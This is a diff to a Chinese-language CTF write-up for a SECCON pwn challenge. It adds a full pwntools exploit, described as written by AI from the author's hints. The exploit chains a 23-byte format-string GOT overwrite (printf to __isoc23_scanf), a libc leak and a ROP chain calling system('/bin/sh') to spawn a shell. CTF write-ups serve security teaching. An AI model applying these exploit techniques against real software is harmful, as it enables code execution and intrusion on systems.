@@ -17,6 +17,8 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
+## 方法一
+
 可以进行格式化字符串攻击，这里主要的问题是限制 23 字节，因此没法写太多数据。分析 libc 的符号：
 
 - __isoc23_scanf 在 0x5fa50
@@ -103,6 +105,125 @@ while True:
     p.interactive()
     break
 ```
+
+提供上述提示后，用 AI 完成的攻击代码：
+
+```python
+#!/usr/bin/env python3
+"""
+One-shot format string with a 23-byte buffer.
+
+1. Partial-overwrite printf@GOT (0x404028) low 2 bytes: printf -> __isoc23_scanf
+   (0x5fa50). Both share high bytes since (base16+0xfa50) and (base16+0x600f0)
+   carry identically into byte 2 for base16 in [0x1000, 0xe000].
+   count = (base16 + 0xfa50) & 0xffff must be <= 4 digits to fit the %11$p leak
+   in 23 bytes, so base16 must be 0x1000 (2640) or 0x2000 (6736); we verify the
+   guess with the leaked base16 and retry on fresh ASLR.
+
+2. The final printf(" answered...%s warmly.\n", name) is now scanf: %s reads an
+   unbounded word into name -> stack overflow -> ROP: ret; pop rdi; "/bin/sh"; system.
+
+3. scanf swallows one extra char after the trailing "\n" (ungetc fails on the
+   unbuffered stdin), so a sacrificial 'x' is sent before the shell takes over.
+"""
+from pwn import *
+import re
+import time
+import random
+
+context.binary = './chall'
+context.log_level = 'info'
+
+# ---- libc / binary offsets ----
+RET_MAIN_OFF = 0x2a1ca   # main's saved ret = base + 0x2a1ca
+SCANF23_OFF  = 0x5fa50   # __isoc23_scanf
+SYSTEM_OFF   = 0x58740
+BINSH_OFF    = 0x1cb42f
+POP_RDI      = 0x401283
+RET_GADGET   = 0x40101a
+PRINTF_GOT   = 0x404028
+
+WS = b'\x09\x0a\x0b\x0c\x0d\x20'
+
+
+def start():
+    return process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])
+
+
+def leak_base(p):
+    """read the %11$p leak -> libc base (or None)"""
+    out = b''
+    end = time.time() + 3
+    while time.time() < end:
+        try:
+            chunk = p.recv(timeout=0.3)
+        except EOFError:
+            break
+        if not chunk:
+            continue
+        out += chunk
+        if b'0x' in out:
+            break
+    m = re.search(rb'0x[0-9a-f]+', out)
+    if not m:
+        return None
+    return int(m.group(0), 16) - RET_MAIN_OFF
+
+
+def try_exploit(count):
+    """one connection; return process with a live shell, or None"""
+    p = start()
+    p.recvuntil(b'asked.\n')
+
+    # 23 bytes: %{count}c%8$hn%11$p + "\x28\x40\x40" + 4 NULs
+    #   arg8 = printf@GOT ; %hn writes count (= __isoc23_scanf low16) ; %11$p leaks libc
+    payload = f'%{count}c%8$hn%11$p'.encode() + p64(PRINTF_GOT)[:3] + b'\x00' * 4
+    assert len(payload) == 23, len(payload)
+    p.send(payload)
+
+    base = leak_base(p)
+    if base is None:
+        p.close()
+        return None
+    # verify guessed count matched the real base16 (i.e. the %hn write is correct)
+    if (base & 0xffff) != ((count - SCANF23_OFF) & 0xffff):
+        p.close()
+        return None
+
+    # ROP over the scanf %s overflow:
+    #   name@rbp-0x20 ; saved rbp at +32 ; saved ret at +40 ; chain continues at +48
+    system = base + SYSTEM_OFF
+    binsh = base + BINSH_OFF
+    rop = b'A' * 32 + p64(0) + p64(RET_GADGET) + p64(POP_RDI) + p64(binsh) + p64(system)
+    if any(b in WS for b in rop):
+        p.close()
+        return None
+
+    # second "printf" is now __isoc23_scanf: match the literal prefix, %s reads our
+    # ROP (no whitespace!) into name -> overflow -> main returns into our ROP chain.
+    prefix = b'answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
+    p.send(prefix + rop + b' warmly.\nx')   # 'x' is swallowed by scanf
+    return p
+
+
+def main():
+    for i in range(200):
+        count = random.choice([2640, 6736])   # base16 0x1000 / 0x2000
+        p = try_exploit(count)
+        if p is not None:
+            log.success(f'got shell! (base16 = {((count - 0xfa50) & 0xffff):#x}, attempt {i})')
+            p.interactive()
+            return
+        if i % 10 == 0:
+            log.info(f'[attempt {i}] retrying...')
+    log.failure('all attempts failed')
+
+
+if __name__ == '__main__':
+    main()
+```
+
+## 方法二
 
 不过，在 redbud 的平台上跑的时候，leak 出来的 libc 地址总是以 0x5000 或 0xd000 结尾，上面的办法就不 work 了，因为没有足够的空间来 leak libc 了。不过，另辟蹊径，还是实现了类似的结果：
 
